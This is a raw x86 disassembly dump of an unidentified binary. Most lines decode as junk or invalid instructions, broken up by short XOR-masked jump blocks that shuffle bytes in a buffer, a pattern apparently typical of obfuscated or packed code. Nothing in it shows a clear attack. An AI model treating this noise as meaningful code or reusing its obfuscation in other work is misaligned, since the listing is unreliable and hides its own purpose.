  404462:	mov    al,0xab
  404464:	outs   dx,BYTE PTR ds:[esi]
  404465:	lock into 
  404467:	(bad)  
  404468:	cmp    eax,0x791d364b
  40446d:	outs   dx,DWORD PTR ds:[esi]
  40446e:	pop    ss
  40446f:	or     eax,0xedd9777a
  404474:	sahf   
  404475:	ret    
  404476:	mov    dh,ah
  404478:	lock test BYTE PTR [ebp+0x56d040f6],cl
  40447f:	sbb    eax,0x3e76b5ed
  404484:	clc    
  404485:	fsubr  DWORD PTR [esi+ecx*2+0x2c]
  404489:	call   0xaf57de88
  40448e:	mov    ebx,DWORD PTR [ebp-0x10]
  404491:	jmp    0x4045f6
  404496:	psraw  mm6,0x10
  40449a:	out    0xfb,al
  40449c:	frstor ds:0xaa51ed7e
  4044a2:	mov    esi,0x7e13db8b
  4044a7:	pop    ds
  4044a8:	jl     0x404526
  4044aa:	xor    al,0x7f
  4044ac:	jl     0x40452a
  4044ae:	dec    edi
  4044af:	inc    ecx
  4044b0:	adc    BYTE PTR [ecx+0x756eaa2f],ah
  4044b6:	sahf   
  4044b7:	cld    
  4044b8:	add    eax,0xc2345c86
  4044bd:	adc    eax,0x8c3f74b1
  4044c2:	cdq    
  4044c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c5:	(bad)  
  4044c6:	adc    BYTE PTR [ebp-0x13],ah
  4044c9:	in     al,0x4a
  4044cb:	retf   0x536f
  4044ce:	pop    ecx
  4044cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d1:	push   edx
  4044d2:	push   edx
  4044d3:	sar    BYTE PTR [ebx-0x4b],cl
  4044d6:	adc    edx,0x58
  4044d9:	in     eax,dx
  4044da:	out    dx,al
  4044db:	loop   0x404493
  4044dd:	fs call 0x76b44a79
  4044e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e4:	rol    BYTE PTR [esi],1
  4044e6:	jae    0x4044e3
  4044e8:	cli    
  4044e9:	mov    ds:0x516fc7e6,al
  4044ee:	loope  0x40455c
  4044f0:	std    
  4044f1:	adc    BYTE PTR [ebx],dl
  4044f3:	jmp    0x68df:0xc4a72064
  4044fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044fb:	push   0xffffffb0
  4044fd:	mov    al,ds:0xef2080c2
  404502:	ss dec edx
  404504:	fs jle 0x4044f6
  404507:	mov    cl,0xe6
  404509:	int    0x6c
  40450b:	jg     0x40448d
  40450d:	sub    al,0xde
  40450f:	rol    ebx,0xd0
  404512:	sahf   
  404513:	js     0x40452f
  404515:	addr16 xor al,ch
  404518:	add    al,0x40
  40451a:	aas    
  40451b:	jno    0x4044c9
  40451d:	and    BYTE PTR [ebx],ch
  40451f:	test   eax,0xc2c176a1
  404524:	(bad)  
  404525:	lods   eax,DWORD PTR ds:[esi]
  404526:	loope  0x4044af
  404528:	adc    al,0x7e
  40452a:	bnd jnp 0x404579
  40452d:	add    DWORD PTR [ebp-0xab9ebcb],ebp
  404533:	jae    0x404582
  404535:	push   edi
  404536:	adc    DWORD PTR [eax-0x2e2b01dc],ebx
  40453c:	jl     0x40451c
  40453e:	loopne 0x4044ef
  404540:	shr    DWORD PTR [esi-0x21],0x86
  404544:	popf   
  404545:	out    dx,al
  404546:	repnz push 0xc474a7e8
  40454c:	enter  0x32ba,0x9a
  404550:	mov    BYTE PTR [ebx+0x15aefef1],ah
  404556:	jns    0x404587
  404558:	hlt    
  404559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40455a:	inc    edx
  40455b:	out    0x42,eax
  40455d:	xchg   edx,eax
  40455e:	jne    0x4045c5
  404560:	sbb    edi,DWORD PTR [edi+edx*1-0x24dcdda7]
  404567:	out    0xf3,eax
  404569:	and    bl,BYTE PTR [edi+0x184eb245]
  40456f:	daa    
  404570:	popf   
  404571:	call   0xa885:0x9b766fa2
  404578:	out    dx,eax
  404579:	sbb    eax,0xe8ce551e
  40457e:	mov    edx,0x3d2dfe05
  404583:	push   ebx
  404584:	je     0x4045cc
  404586:	xlat   BYTE PTR ds:[ebx]
  404587:	or     eax,DWORD PTR [ecx+0x24]
  40458a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40458b:	out    0xc3,eax
  40458d:	ds push esp
  40458f:	xchg   ebx,eax
  404590:	inc    ebp
  404591:	and    DWORD PTR [edx],esp
  404593:	fs dec eax
  404595:	jno    0x4045cf
  404597:	sub    ecx,DWORD PTR [esi+0x72]
  40459a:	or     al,0xa2
  40459c:	dec    esp
  40459d:	pushf  
  40459e:	sbb    dl,BYTE PTR [ecx+0x6]
  4045a1:	cmc    
  4045a2:	dec    esi
  4045a3:	mov    ?,WORD PTR [edx+0x51145b9a]
  4045a9:	addr16 inc eax
  4045ab:	xchg   esi,eax
  4045ac:	pop    ebp
  4045ad:	int    0x7b
  4045af:	lock mov esp,0xf1dd6e5b
  4045b5:	cdq    
  4045b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b7:	xchg   BYTE PTR [edx+0xb44d0a2],bh
  4045bd:	rol    BYTE PTR [edx+eax*8],0x5d
  4045c1:	pop    es
  4045c2:	loopne 0x40454b
  4045c4:	push   0xffffffbe
  4045c6:	push   0x4e
  4045c8:	cmp    eax,0xab8d9559
  4045cd:	test   DWORD PTR [ecx],0x7eca2b1
  4045d3:	aas    
  4045d4:	test   DWORD PTR [ecx],ebx
  4045d6:	in     al,0x26
  4045d8:	dec    eax
  4045d9:	xor    eax,0x3726d734
  4045de:	retf   
  4045df:	jbe    0x4045ab
  4045e1:	and    DWORD PTR [ebx+0x63],ebx
  4045e4:	add    al,0xc4
  4045e6:	cld    
  4045e7:	xchg   ecx,eax
  4045e8:	movd   mm5,DWORD PTR [esp+edi*2-0x75]
  4045ed:	cmp    edi,DWORD PTR ds:0xcf35d324
  4045f3:	scas   eax,DWORD PTR es:[edi]
  4045f4:	fadd   DWORD PTR [ebp-0x25c420d5]
  4045fa:	ja     0x404608
  404600:	mov    edx,DWORD PTR [ebp-0x34]
  404603:	jmp    0x40462f
  404608:	mov    edx,DWORD PTR [ebp-0x3c]
  40460b:	mov    edi,DWORD PTR [ebp-0x4]
  40460e:	xor    edx,eax
  404610:	xor    edi,eax
  404612:	add    edx,ecx
  404614:	add    edi,ecx
  404616:	imul   edx,edi
  404619:	mov    edi,DWORD PTR [ebp-0x8]
  40461c:	mov    ebx,DWORD PTR [ebp-0x10]
  40461f:	sub    ebx,edi
  404621:	cmp    ebx,edx
  404623:	mov    edx,DWORD PTR [ebp-0x38]
  404626:	jbe    0x40462f
  40462c:	mov    edx,DWORD PTR [ebp-0x3c]
  40462f:	mov    edi,DWORD PTR [ebp-0x4]
  404632:	xor    edi,eax
  404634:	xor    edx,eax
  404636:	add    edi,ecx
  404638:	add    edx,ecx
  40463a:	jmp    0x40479f
  40463f:	mov    WORD PTR [ecx+esi*8+0x3f],es
  404643:	dec    ecx
  404644:	(bad)  [esi+0x47]
  404647:	stos   BYTE PTR es:[edi],al
  404648:	call   0x7e2b:0x8d9bb2d5
  40464f:	ss push ds
  404651:	jl     0x4046cf
  404653:	xor    al,0x7f
  404655:	jl     0x4046d3
  404657:	test   DWORD PTR [esi-0x51],esp
  40465a:	xchg   DWORD PTR [eax+0x63],edx
  40465d:	es adc al,0xd9
  404660:	sar    DWORD PTR [edx+0x6e],0xf1
  404664:	and    eax,DWORD PTR [ecx+0x66f165c8]
  40466a:	push   ebx
  40466b:	ins    BYTE PTR es:[edi],dx
  40466c:	out    0x94,eax
  40466e:	js     0x404634
  404670:	add    BYTE PTR [eax+0x2d],dl
  404673:	stos   BYTE PTR es:[edi],al
  404674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404675:	shr    ah,0x55
  404678:	int3   
  404679:	dec    bl
  40467b:	xor    edi,eax
  40467d:	push   edx
  40467e:	cmp    ecx,DWORD PTR [edx-0x723fa8e4]
  404684:	std    
  404685:	mov    esp,0x4392e666
  40468a:	lea    esi,[edi]
  40468c:	push   ds
  40468d:	cmp    ecx,DWORD PTR [ebp+0x30633ee9]
  404693:	mov    esp,?
  404695:	xor    ch,bl
  404697:	rcr    cl,cl
  404699:	pop    ds
  40469a:	xor    eax,0xae49f706
  40469f:	push   ecx
  4046a0:	jecxz  0x40471d
  4046a2:	xchg   esi,eax
  4046a3:	jp     0x4046ba
  4046a5:	mov    dh,0x4a
  4046a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a8:	mov    esp,0x1bc2605e
  4046ad:	push   esi
  4046ae:	dec    eax
  4046af:	mov    ebx,0xfa8fde2e
  4046b4:	mov    ch,0x8b
  4046b6:	mov    dl,0x4b
  4046b8:	pop    ds
  4046b9:	push   ds
  4046ba:	int    0xed
  4046bc:	cmp    ebx,esp
  4046be:	mov    al,0x8a
  4046c0:	inc    DWORD PTR [eax+ebp*4-0x27b25da8]
  4046c7:	xchg   edi,eax
  4046c8:	mov    BYTE PTR [eax-0x72],cl
  4046cb:	aad    0xa8
  4046cd:	push   esi
  4046ce:	dec    ebx
  4046cf:	mov    esp,0x39b0bf6b
  4046d4:	mov    bl,0xdc
  4046d6:	mul    DWORD PTR [edi+ebp*2-0x1d]
  4046da:	add    dh,ah
  4046dc:	add    BYTE PTR [esi-0x6e],dh
  4046df:	retf   0x73a4
  4046e2:	adc    eax,0xc3a20c0d
  4046e7:	aaa    
  4046e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046e9:	pop    esi
  4046ea:	or     eax,0x6862eb36
  4046ef:	mov    ah,0xad
  4046f1:	addr16 add al,0xa1
  4046f4:	ror    BYTE PTR [ecx+eiz*4-0xb],1
  4046f8:	adc    al,0xb0
  4046fa:	sbb    BYTE PTR [edx],bl
  4046fc:	mov    cl,0xf3
  4046fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046ff:	jg     0x40469f
  404701:	test   DWORD PTR [esp+ecx*4],edx
  404704:	aad    0xc8
  404706:	out    dx,al
  404707:	add    eax,0x9364de35
  40470c:	call   0x64a52b31
  404711:	or     BYTE PTR [edx+ecx*4-0x76a866a8],dl
  404718:	sbb    ah,cl
  40471a:	and    edi,ebp
  40471c:	mov    dl,ah
  40471e:	mov    ah,0xeb
  404720:	adc    eax,0x1b18a8ca
  404725:	sub    dh,BYTE PTR [ebx-0x6d]
  404728:	xchg   ecx,ebx
  40472a:	stc    
  40472b:	xchg   esi,eax
  40472c:	popf   
  40472d:	add    BYTE PTR [esp+ecx*4-0x6def56ba],dh
  404734:	sti    
  404735:	call   0xfa95115c
  40473a:	mov    cl,0xe8
  40473c:	iret   
  40473d:	sub    DWORD PTR [edi],ebx
  40473f:	mov    al,ds:0x32f7cde5
  404744:	mov    al,ds:0x7836158d
  404749:	add    ecx,0x210eb12d
  40474f:	sub    eax,0xd2c65c1b
  404754:	clc    
  404755:	nop
  404756:	or     DWORD PTR [eax+0x29],edx
  404759:	mov    al,ds:0x1f877a0
  40475e:	(bad)  
  40475f:	jmp    0x40476a
  404761:	jbe    0x4047c5
  404763:	rcr    esp,0x36
  404766:	das    
  404767:	cld    
  404768:	imul   esp,ecx,0xf0c49335
  40476e:	mov    cl,0x91
  404770:	out    dx,al
  404771:	jp     0x404785
  404773:	int3   
  404774:	xor    ch,ch
  404776:	ja     0x4047c3
  404778:	scas   eax,DWORD PTR es:[edi]
  404779:	in     al,dx
  40477a:	pushf  
  40477b:	mov    ebp,0xebf78723
  404780:	cmp    al,0x46
  404782:	and    BYTE PTR [edx-0x57],ch
  404785:	or     DWORD PTR [edi+0x7db56d6],0x41
  40478c:	jb     0x4047cb
  40478e:	neg    DWORD PTR [edi]
  404790:	push   eax
  404791:	inc    ebx
  404792:	out    dx,eax
  404793:	fs push eax
  404795:	adc    al,0x28
  404797:	cmp    BYTE PTR [eax+0x3a48eb49],ch
  40479d:	sub    DWORD PTR [ecx],edi
  40479f:	imul   edx,edi
  4047a2:	mov    DWORD PTR [ebp+0xc],edx
  4047a5:	mov    edx,DWORD PTR [ebp+0xc]
  4047a8:	mov    DWORD PTR [ebp-0x24],edx
  4047ab:	mov    edx,DWORD PTR [ebp-0x8]
  4047ae:	add    edx,DWORD PTR [ebp-0x40]
  4047b1:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  4047b8:	mov    DWORD PTR [ebp-0x1c],edx
  4047bb:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  4047c2:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4047c9:	mov    edx,DWORD PTR [ebp-0x18]
  4047cc:	xor    edx,eax
  4047ce:	add    edx,ecx
  4047d0:	jmp    0x404c6c
  4047d5:	mov    edx,DWORD PTR [ebp-0x18]
  4047d8:	xor    edx,eax
  4047da:	add    edx,DWORD PTR [ebp-0x14]
  4047dd:	mov    edi,DWORD PTR [ebp-0x1c]
  4047e0:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  4047e7:	mov    BYTE PTR [ebp+0xf],dl
  4047ea:	jmp    0x40494f
  4047ef:	int    0xf4
  4047f1:	mov    esi,0xfd66b566
  4047f6:	mov    ebx,0x8fce1da9
  4047fb:	pop    edx
  4047fc:	xchg   edx,eax
  4047fd:	jmp    0x7c51d6e2
  404802:	jl     0x404838
  404804:	jg     0x404882
  404806:	jl     0x404872
  404808:	jge    0x404839
  40480a:	fnsave [si]
  40480d:	dec    edi
  40480e:	rcl    BYTE PTR [esi],0xf8
  404811:	jp     0x4047d6
  404813:	retf   
  404814:	inc    eax
  404815:	(bad)  
  404816:	xchg   esi,eax
  404817:	and    ebx,DWORD PTR [ebp+0xcf3b51]
  40481d:	fwait
  40481e:	sub    BYTE PTR [edx-0x74a8df06],dh
  404824:	jge    0x4048a5
  404826:	xor    eax,0xdfdfc053
  40482b:	call   FWORD PTR [eax-0x4a148ace]
  404831:	xchg   BYTE PTR [edi+esi*4-0x33],ah
  404835:	cli    
  404836:	loope  0x4047bb
  404838:	dec    eax
  404839:	jge    0x40483d
  40483b:	and    DWORD PTR [edi],ecx
  40483d:	adc    bl,ch
  40483f:	ja     0x4048b0
  404841:	retf   0x3ed1
  404844:	je     0x4047f5
  404846:	sub    al,0xb
  404848:	inc    edx
  404849:	and    eax,0x250170b3
  40484e:	sub    DWORD PTR [ebx+0x3ebb7107],0x3e
  404855:	xchg   esi,eax
  404856:	add    DWORD PTR [esi],0x1740dec5
  40485c:	push   ds
  40485d:	retf   0x3659
  404860:	les    edx,FWORD PTR [esi+0x2b051146]
  404866:	pop    ss
  404867:	loopne 0x40481e
  404869:	push   ebx
  40486a:	and    bh,0xfe
  40486d:	adc    DWORD PTR [ecx-0x2e],edi
  404870:	aad    0x68
  404872:	leave  
  404873:	pusha  
  404874:	or     bl,BYTE PTR [esi]
  404876:	int3   
  404877:	pop    ebx
  404878:	mov    al,ds:0xa7d6f669
  40487d:	push   ss
  40487e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40487f:	sbb    eax,0x6b6079dc
  404884:	(bad)  
  404885:	jge    0x4048a1
  404887:	popa   
  404888:	xor    BYTE PTR [ebx+0x36],bh
  40488b:	xchg   esp,eax
  40488c:	hlt    
  40488d:	outs   dx,DWORD PTR ds:[esi]
  40488e:	repz add esi,DWORD PTR ds:0x36c5fdf8
  404895:	shl    DWORD PTR [esi-0x4d],cl
  404898:	imul   eax,DWORD PTR [edx+edx*1-0x7b2d1e9a],0x7de2dd94
  4048a3:	dec    eax
  4048a4:	cmp    ecx,DWORD PTR [bx+0x77cd]
  4048a9:	fwait
  4048aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ab:	mov    ebp,0xa1b70cd9
  4048b0:	popf   
  4048b1:	push   cs
  4048b2:	out    dx,al
  4048b3:	or     DWORD PTR [edi-0x1567035e],ebp
  4048b9:	dec    edi
  4048ba:	pop    es
  4048bb:	aad    0x4f
  4048bd:	pop    ebp
  4048be:	mov    ebx,0xfd80d4c3
  4048c3:	in     al,0x77
  4048c5:	shl    BYTE PTR gs:[edx*1-0x65ccabc0],cl
  4048cd:	mov    eax,ds:0x83219229
  4048d2:	mov    ch,0xfa
  4048d4:	nop
  4048d5:	sbb    BYTE PTR [esi],ah
  4048d7:	std    
  4048d8:	xor    ah,ah
  4048da:	ja     0x404907
  4048dc:	sub    ebx,DWORD PTR [esi-0x647fd6c3]
  4048e2:	cmp    al,0x52
  4048e4:	out    0x8a,al
  4048e6:	push   0xfffffff7
  4048e8:	jp     0x4048ee
  4048ea:	sub    bl,bh
  4048ec:	mov    al,0x93
  4048ee:	add    al,0x88
  4048f0:	mov    BYTE PTR [eax],ah
  4048f2:	add    eax,0xc76b404c
  4048f7:	int    0x80
  4048f9:	cdq    
  4048fa:	mov    dh,0x11
  4048fc:	jne    0x404897
  4048fe:	rol    DWORD PTR [ebx+ebp*4],0x9c
  404902:	mov    dh,0xb2
  404904:	shl    DWORD PTR [eax],1
  404906:	test   al,0x49
  404908:	outs   dx,BYTE PTR ds:[esi]
  404909:	iret   
  40490a:	add    DWORD PTR [esi-0x5],edx
  40490d:	fmul   QWORD PTR [edx]
  40490f:	enter  0x1c9d,0xc0
  404913:	sub    eax,ecx
  404915:	mov    ebp,0x62b2995
  40491a:	ja     0x404965
  40491c:	cmp    BYTE PTR [eax],bh
  40491e:	sub    edx,esi
  404920:	pop    edx
  404921:	sbb    eax,0xd01ceb38
  404926:	or     esp,DWORD PTR [esi+0x308d1842]
  40492c:	cmp    al,0x38
  40492e:	out    0xad,eax
  404930:	dec    esp
  404931:	loope  0x404977
  404933:	cwde   
  404934:	pop    es
  404935:	sbb    eax,0x66aba9d
  40493a:	mov    cl,0xfc
  40493c:	and    BYTE PTR [edx],ah
  40493e:	push   edx
  40493f:	in     eax,dx
  404940:	ja     0x40496d
  404942:	add    eax,0xa446762c
  404947:	out    dx,eax
  404948:	inc    ebx
  404949:	pusha  
  40494a:	add    BYTE PTR [esi],0xcd
  40494d:	cdq    
  40494e:	mov    edi,0x33f4558b
  404953:	rol    BYTE PTR [ebx],1
  404955:	push   ebp
  404956:	in     al,dx
  404957:	mov    edi,DWORD PTR [ebp-0x1c]
  40495a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  404961:	mov    BYTE PTR [ebp+0xb],dl
  404964:	mov    dl,BYTE PTR [ebp+0xf]
  404967:	mov    edi,DWORD PTR [ebp-0xc]
  40496a:	xor    edi,eax
  40496c:	add    edi,DWORD PTR [ebp-0x14]
  40496f:	mov    ebx,DWORD PTR [ebp-0x1c]
  404972:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404979:	jmp    0x404ade
  40497e:	adc    ebx,DWORD PTR cs:[ecx]
  404981:	iret   
  404982:	sbb    eax,0xb1d5e6fd
  404987:	and    edi,DWORD PTR ss:[ebx+0x58a98d88]
  40498e:	inc    esi
  40498f:	adc    BYTE PTR [esp+edi*2+0x34],bh
  404993:	jg     0x404a11
  404995:	jl     0x40494a
  404997:	or     eax,0xb7869841
  40499c:	lods   al,BYTE PTR ds:[esi]
  40499d:	ins    DWORD PTR es:[edi],dx
  40499e:	loope  0x40492a
  4049a0:	jle    0x4049b9
  4049a2:	xchg   BYTE PTR [edx-0x55346d5d],ch
  4049a8:	inc    ecx
  4049a9:	inc    eax
  4049aa:	jle    0x4049f8
  4049ac:	inc    eax
  4049ad:	mov    dh,0x46
  4049af:	xor    edi,ebp
  4049b1:	jle    0x404a23
  4049b3:	aas    
  4049b4:	push   es
  4049b5:	mov    ah,0x66
  4049b7:	iret   
  4049b8:	add    ch,BYTE PTR [eax+eiz*1-0x4]
  4049bc:	add    BYTE PTR [ecx-0x627b89ee],cl
  4049c2:	out    0x58,eax
  4049c4:	push   cs
  4049c5:	sbb    al,0x17
  4049c7:	push   0xffffffdc
  4049c9:	mov    ebx,eax
  4049cb:	shl    dh,0x38
  4049ce:	test   DWORD PTR [eax],edi
  4049d0:	ret    0xe3d9
  4049d3:	xlat   BYTE PTR ds:[ebx]
  4049d4:	sub    eax,0xc4bc7872
  4049d9:	pop    ss
  4049da:	out    dx,eax
  4049db:	add    BYTE PTR [edi+0x4d4d9b99],dh
  4049e1:	push   edx
  4049e2:	or     DWORD PTR [esi],ecx
  4049e4:	xchg   BYTE PTR [edi-0x51a61152],cl
  4049ea:	or     cl,bh
  4049ec:	and    eax,0xbe70a290
  4049f1:	lods   eax,DWORD PTR ds:[esi]
  4049f2:	pop    edi
  4049f3:	pop    edx
  4049f4:	test   BYTE PTR [edx-0x5],ah
  4049f7:	xchg   ecx,eax
  4049f8:	(bad)  
  4049f9:	cmp    esp,edi
  4049fb:	cwde   
  4049fc:	dec    edi
  4049fd:	jae    0x404a7d
  4049ff:	sbb    DWORD PTR [edi+0x58d8d0d2],edx
  404a05:	push   ebx
  404a06:	(bad)  
  404a07:	push   edx
  404a08:	pop    esp
  404a09:	sub    eax,esp
  404a0b:	and    ebx,DWORD PTR [ecx]
  404a0d:	in     eax,0x2b
  404a0f:	fisttp QWORD PTR [edi-0x5dcd1f23]
  404a15:	jmp    0x62db:0x7ea2e056
  404a1c:	ds mov dh,0x65
  404a1f:	jl     0x404a2c
  404a21:	pop    ecx
  404a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a23:	sub    eax,0x151f7941
  404a28:	or     DWORD PTR [eax+edx*4+0x40],edx
  404a2c:	cmp    ch,BYTE PTR [eax]
  404a2e:	mov    edi,0xcbecb3f6
  404a33:	fidivr WORD PTR [eax+0x49bc9ad3]
  404a39:	push   ebp
  404a3a:	add    DWORD PTR [esi+0x46],ecx
  404a3d:	jno    0x4049dd
  404a3f:	and    ebp,DWORD PTR [esi+0x3f]
  404a42:	repnz or BYTE PTR [edx],dl
  404a45:	shr    DWORD PTR [edx-0x6b7f20ab],1
  404a4b:	pop    ebx
  404a4c:	cwd    
  404a4e:	das    
  404a4f:	mov    ds:0x9a8ff76c,al
  404a54:	fst    DWORD PTR [edi]
  404a56:	push   0xffffff9a
  404a58:	adc    DWORD PTR [esi-0x4122f081],0xe6a33041
  404a62:	popa   
  404a63:	sbb    bl,cl
  404a65:	adc    eax,0xf5686582
  404a6a:	add    DWORD PTR [ebp+0x1ac7a617],eax
  404a70:	mov    eax,0xbba6be3b
  404a75:	mov    gs,WORD PTR [ebp+0x6d]
  404a78:	pop    ebp
  404a79:	pop    edi
  404a7a:	aam    0x5f
  404a7c:	loop   0x404ae7
  404a7e:	cmp    esi,edx
  404a80:	div    DWORD PTR [edx+0x6a]
  404a83:	mov    bl,0x17
  404a85:	xchg   ebx,eax
  404a86:	push   es
  404a87:	pop    edx
  404a88:	aaa    
  404a89:	push   ebx
  404a8a:	nop    esi
  404a8d:	cli    
  404a8e:	sub    ebx,edx
  404a90:	mov    esp,0x56b8a72e
  404a95:	adc    BYTE PTR fs:[eax+edx*1],cl
  404a99:	icebp  
  404a9a:	scas   al,BYTE PTR es:[edi]
  404a9b:	fld    QWORD PTR [ecx+edx*8]
  404a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a9f:	sbb    ah,BYTE PTR [edi+eiz*8-0x57e4af31]
  404aa6:	adc    BYTE PTR [esi],cl
  404aa8:	(bad)  
  404aa9:	push   eax
  404aaa:	stos   DWORD PTR es:[edi],eax
  404aab:	fst    DWORD PTR [ecx-0x6ce3bc5f]
  404ab1:	cld    
  404ab2:	pop    ebx
  404ab3:	pop    ecx
  404ab4:	xchg   esi,eax
  404ab5:	ins    DWORD PTR es:[edi],dx
  404ab6:	hlt    
  404ab7:	test   DWORD PTR [ebx+0x28ba52a6],edx
  404abd:	das    
  404abe:	aad    0xf1
  404ac0:	loope  0x404a81
  404ac2:	xlat   BYTE PTR ds:[ebx]
  404ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac4:	iret   
  404ac5:	lods   eax,DWORD PTR ds:[esi]
  404ac6:	and    eax,0xe11e6895
  404acb:	adc    eax,esi
  404acd:	cld    
  404ace:	test   BYTE PTR [edx+ecx*4],bl
  404ad1:	pop    edi
  404ad2:	std    
  404ad3:	dec    ebx
  404ad4:	xchg   ebx,eax
  404ad5:	sahf   
  404ad6:	jecxz  0x404b24
  404ad8:	imul   edi,ebx,0xcd3186fa
  404ade:	mov    dl,BYTE PTR [ebp+0xb]
  404ae1:	mov    edi,DWORD PTR [ebp-0x18]
  404ae4:	xor    edi,eax
  404ae6:	add    edi,DWORD PTR [ebp-0x14]
  404ae9:	mov    ebx,DWORD PTR [ebp-0x1c]
  404aec:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404af3:	mov    edx,DWORD PTR [ebp-0x44]
  404af6:	mov    edi,DWORD PTR [ebp-0xc]
  404af9:	xor    edx,eax
  404afb:	xor    edi,eax
  404afd:	add    edx,ecx
  404aff:	add    edi,ecx
  404b01:	imul   edx,edi
  404b04:	add    edx,DWORD PTR [ebp-0x14]
  404b07:	jmp    0x404c6c
  404b0c:	stos   DWORD PTR es:[edi],eax
  404b0d:	outs   dx,BYTE PTR ds:[esi]
  404b0e:	cmp    al,0x3d
  404b10:	fnstsw WORD PTR [ebp+0x313d6e7d]
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	sbb    eax,0xac44995a
  404b1c:	push   ds
  404b1d:	adc    bh,BYTE PTR [esp+edi*2+0x34]
  404b21:	jg     0x404b9f
  404b23:	jl     0x404aba
  404b25:	cmp    al,0x2e
  404b27:	ins    DWORD PTR es:[edi],dx
  404b28:	arpl   WORD PTR [ebp-0x25],dx
  404b2b:	mov    WORD PTR [edx+0x7c603959],gs
  404b31:	cmc    
  404b32:	xchg   ebx,eax
  404b33:	push   ebx
  404b34:	icebp  
  404b35:	adc    ecx,DWORD PTR [ebp+0x1bd5f01b]
  404b3b:	das    
  404b3c:	leave  
  404b3d:	mov    cl,0xe9
  404b3f:	xchg   esi,eax
  404b40:	mov    esp,DWORD PTR [ecx-0x27]
  404b43:	aam    0x10
  404b45:	xor    bl,BYTE PTR ds:0xd5ee662e
  404b4b:	(bad)  ds:0xd267b581
  404b51:	xchg   edx,eax
  404b52:	sti    
  404b53:	inc    eax
  404b54:	xlat   BYTE PTR ds:[ebx]
  404b55:	popa   
  404b56:	imul   BYTE PTR ds:0xfd8ad217
  404b5c:	pop    ss
  404b5d:	aam    0x2a
  404b5f:	push   ss
  404b60:	cmc    
  404b61:	add    DWORD PTR [edx],ebp
  404b63:	xor    BYTE PTR [esi-0x45],bh
  404b66:	imul   esp,DWORD PTR [eax+0x13],0x49373799
  404b6d:	ss mov cl,0xdc
  404b70:	das    
  404b71:	cs mov ebp,ebx
  404b74:	cmc    
  404b75:	dec    ecx
  404b76:	jle    0x404bb1
  404b78:	fwait
  404b79:	ret    
  404b7a:	stc    
  404b7b:	inc    ecx
  404b7c:	fistp  QWORD PTR [eax-0x64]
  404b7f:	sbb    al,0x71
  404b81:	mov    eax,0x77734987
  404b86:	dec    esi
  404b87:	std    
  404b88:	loope  0x404b3a
  404b8a:	repnz shr DWORD PTR [esi+eiz*1],1
  404b8e:	mov    WORD PTR [edx+0x305a4217],gs
  404b94:	xchg   esi,eax
  404b95:	mov    BYTE PTR [eax-0x539df81f],ch
  404b9b:	jnp    0x404b5a
  404b9d:	retf   0x66c0
  404ba0:	jle    0x404b53
  404ba2:	(bad)  
  404ba3:	retf   0x92d
  404ba6:	push   ss
  404ba7:	arpl   WORD PTR [esi+0x53],bp
  404baa:	ss push cs
  404bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bad:	fimul  WORD PTR [edx]
  404baf:	ror    DWORD PTR [edi-0x29620cf6],1
  404bb5:	or     al,0xdd
  404bb7:	and    eax,esi
  404bb9:	out    0x2f,eax
  404bbb:	mov    eax,ds:0xc7d77397
  404bc0:	jne    0x404bc4
  404bc2:	sub    BYTE PTR [edi-0xf],cl
  404bc5:	and    al,0xfe
  404bc7:	pop    eax
  404bc8:	hlt    
  404bc9:	push   edi
  404bca:	int    0x86
  404bcc:	xchg   BYTE PTR [ebx+0x5598e6a8],cl
  404bd2:	add    al,0xfb
  404bd4:	mov    BYTE PTR [ecx],dl
  404bd6:	or     BYTE PTR [edx-0x29],0x3c
  404bda:	xchg   DWORD PTR [ebx-0x3e74a3bd],edx
  404be0:	jmp    0x8bd1f1d9
  404be5:	cmc    
  404be6:	(bad)  
  404be7:	jecxz  0x404b85
  404be9:	popa   
  404bea:	and    BYTE PTR [edx],al
  404bec:	dec    ebx
  404bed:	and    al,BYTE PTR [edx]
  404bef:	lea    ebp,[edi+ebp*4+0x3c]
  404bf3:	call   0xb4ba0127
  404bf8:	daa    
  404bf9:	stos   DWORD PTR es:[edi],eax
  404bfa:	test   BYTE PTR [edx+0x9660fff],dl
  404c00:	test   al,0xb2
  404c02:	leave  
  404c03:	ss retf 
  404c05:	rcl    BYTE PTR [esi+ebp*8],0xd1
  404c09:	retf   0x9d41
  404c0c:	into   
  404c0d:	mov    DWORD PTR [ebp+0x689dedd8],edx
  404c13:	rol    BYTE PTR [edx],1
  404c15:	fsubr  QWORD PTR [esi]
  404c17:	push   eax
  404c18:	fcmove st,st(0)
  404c1a:	js     0x404ba1
  404c1c:	xchg   ebp,eax
  404c1d:	add    esp,ebx
  404c1f:	arpl   WORD PTR [ecx],di
  404c21:	les    ecx,FWORD PTR [ebx-0x73ca2c9f]
  404c27:	lods   eax,DWORD PTR ds:[esi]
  404c28:	sbb    al,0x5e
  404c2a:	iret   
  404c2b:	into   
  404c2c:	xor    DWORD PTR [edi+eiz*8-0x6913a215],0xfffffffd
  404c34:	push   eax
  404c35:	sub    eax,0xd97b635a
